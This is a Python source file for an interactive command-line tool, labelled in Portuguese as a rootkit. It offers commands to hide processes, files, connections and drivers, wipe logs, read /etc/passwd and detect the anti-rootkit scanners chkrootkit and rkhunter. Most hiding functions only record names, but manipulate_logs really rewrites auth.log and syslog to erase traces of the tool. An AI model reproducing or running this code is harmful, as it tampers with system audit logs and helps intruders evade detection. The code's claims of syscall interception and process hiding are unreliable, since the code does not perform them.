import os
import sys
import psutil
import logging
from __style__ import __unit__
from __style__ import __limpar__
import socket
import random
import string
# Configuração de log para manipulação de logs
logging.basicConfig(filename='rootkit.log', level=logging.INFO)
__unit__()

class Rootkit:
    def __init__(self):
        self.hidden_processes = []
        self.hidden_files = []
        self.hidden_connections = []
        self.hidden_drivers = []
        self.is_running = True

    # Função para gerar nomes de arquivos obfuscados
    def obfuscate_name(self, original_name):
        obfuscated = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        return obfuscated

    def hide_process(self, process_name):
        self.hidden_processes.append(process_name)
        print(f"\33[1m\33[34m [+] PROCESSO '{process_name}' OCULTADO.")

    def hide_file(self, file_path):
        if os.path.exists(file_path):
            hidden_file_path = os.path.join(os.path.dirname(file_path), '.' + os.path.basename(file_path))
            os.rename(file_path, hidden_file_path)  # Renomeia o arquivo para ocultá-lo
            self.hidden_files.append(hidden_file_path)
            print(f"\33[1m\33[34m [+] ARQUIVO '{file_path}' OCULTO COMO '{hidden_file_path}'.")
        else:
            print(f"\33[1m\33[90m [!] ARQUIVO '{file_path}' NÃO ENCONTRADO.")

    def hide_driver(self, driver_name):
        self.hidden_drivers.append(driver_name)
        print(f"\33[1m\33[34m [+] DRIVER '{driver_name}' OCULTADO.")

    def show_hidden(self):
        print("\33[1m\33[96m [+] ITENS OCULTOS:")
        print("\33[1m\33[34m  [#] PROCESSO:", self.hidden_processes)
        print("\33[1m\33[34m  [#] ARQUIVOS:", self.hidden_files)
        print("\33[1m\33[34m  [#] DRIVERS:", self.hidden_drivers)
        print("\33[1m\33[34m  [#] CONEXÕES:", self.hidden_connections)

    def verify(self):
        print("\n\33[1m\33[96m [+] VERIFICANDO ITMS OCULTOS...\n")

        # Verificação de processos ocultos
        print("\33[1m\33[34m [+] PROCESSOS OCULTOS:")
        if self.hidden_processes:
            for process in self.hidden_processes:
                print(f"\33[1m\33[96m  - {process}")
        else:
            print("\33[1m\33[90m  [!] NENHUM PROCESSO OCULTO ENCONTRADO.")

        # Verificação de arquivos ocultos
        print("\33[1m\33[34m [+] ARQUIVOS OCULTOS:")
        if self.hidden_files:
            for file in self.hidden_files:
                print(f"\33[1m\33[96m  - {file}")
        else:
            print("\33[1m\33[90m  [!] NENHUM ARQUIVO OCULTO ENCONTRADO.")

        # Verificação de conexões ocultas
        print("\33[1m\33[34m [+] CONEXÕES OCULTAS:")
        if self.hidden_connections:
            for connection in self.hidden_connections:
                print(f"\33[1m\33[96m  - {connection}")
        else:
            print("\33[1m\33[90m  [!] NENHUMA CONEXÃO OCULTA ENCONTRADA.")

        # Verificação de drivers ocultos
        print("\33[1m\33[34m [+] DRIVERS OCULTOS:")
        if self.hidden_drivers:
            for driver in self.hidden_drivers:
                print(f"\33[1m\33[96m  - {driver}")
        else:
            print("\33[1m\33[90m  [!] NENHUM DRIVER OCULTO.\n")
            
    def hide_connection(self, connection):
        try:
            ip, port = connection.split(':')
            # Verifica se o IP é válido
            socket.inet_aton(ip)
            self.hidden_connections.append(connection)
            print(f"\33[1m\33[34m [+] CONEXÃO '{connection}' OCULTADA.")
        except socket.error:
            print(f"\33[1m\33[90m [!] CONEXÃO INVÁLIDA: '{connection}'.")

    def manipulate_logs(self):
        # Manipulação seletiva de logs
        log_files = ["/var/log/auth.log", "/var/log/syslog"]
        for log_file in log_files:
            if os.path.exists(log_file):
                with open(log_file, 'r+') as f:
                    lines = f.readlines()
                    f.seek(0)
                    for line in lines:
                        if "rootkit" not in line:  # Remove menções ao rootkit
                            f.write(line)
                    f.truncate()
        print("\33[1m\33[96m [+] LOGS MANIPULADOS E LIMPOS.")

    def intercept_syscalls(self):
        print("\33[1m\33[94m [+] MONITORANDO E INTERCEPTANDO CHAMADAS DE SISTEMA:\n")

        # Monitoramento de processos ativos no sistema
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                process_info = proc.info
                print(f"\33[1m\33[96m [#] Processo ID: {process_info['pid']}, Nome: {process_info['name']}, Usuário: {process_info['username']}")
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

        # Interceptação de execução de novos processos
        new_process = "ls"
        print(f"\33[1m\33[94m [+] Interceptando execução do comando: {new_process}")
        os.system(new_process)

        # Simular interceptação de chamadas de leitura/escrita
        file_path = "/etc/passwd"
        if os.path.exists(file_path):
            with open(file_path, 'r') as f:
                print(f"\33[1m\33[96m [+] Lendo conteúdo de {file_path} (Simulando syscall de leitura):")
                print(' ' + f.read(100))

        print("\33[1m\33[94m [+] INTERCEPTAÇÃO DE CHAMADAS DE SISTEMA CONCLUÍDA.")
    
    def detect_anti_rootkit(self):
        # Detecta ferramentas de anti-rootkit em execução
        anti_rootkit_tools = ["chkrootkit", "rkhunter"]
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] in anti_rootkit_tools:
                print(f"\33[1m\33[91m [!] ANTI-ROOTKIT '{proc.info['name']}' DETECTADO!")
                self.is_running = False  # Bypass: fecha o rootkit

    def run(self):
        while self.is_running:
            command = input("\33[1m\33[97m\33[104m rootkit>\33[0m"+"\33[1m\33[97m ").strip().lower()
            if command.startswith("hide_process"):
                _, process_name = command.split(" ", 1)
                self.hide_process(process_name)
            elif command == '' or command == ' ':
                pass
            elif command.startswith("hide_file"):
                _, file_path = command.split(" ", 1)
                self.hide_file(file_path)
            elif command.startswith("hide_connection"):
                _, connection = command.split(" ", 1)
                self.hide_connection(connection)
            elif command.startswith("hide_driver"):
                _, driver_name = command.split(" ", 1)
                self.hide_driver(driver_name)
            elif command == 'clear' or command == 'cls':
                __unit__()
            elif command == "show_hidden":
                self.show_hidden()
            elif command == "manipulate_logs":
                self.manipulate_logs()
            elif command == "intercept_syscalls":
                self.intercept_syscalls()
            elif command == "verify":
                self.verify()  # Chamada à nova funcionalidade verify
            elif command == "exit":
                self.is_running = False
                __unit__()
                print("\33[1m\33[92m [+] SAINDO...")
            elif command == "detect_anti_rootkit":
                self.detect_anti_rootkit()
            else:
                print("\33[1m\33[91m [!] ERRO DE COMANDO: {}".format(command))

if __name__ == "__main__":
    rootkit = Rootkit()
    rootkit.run()
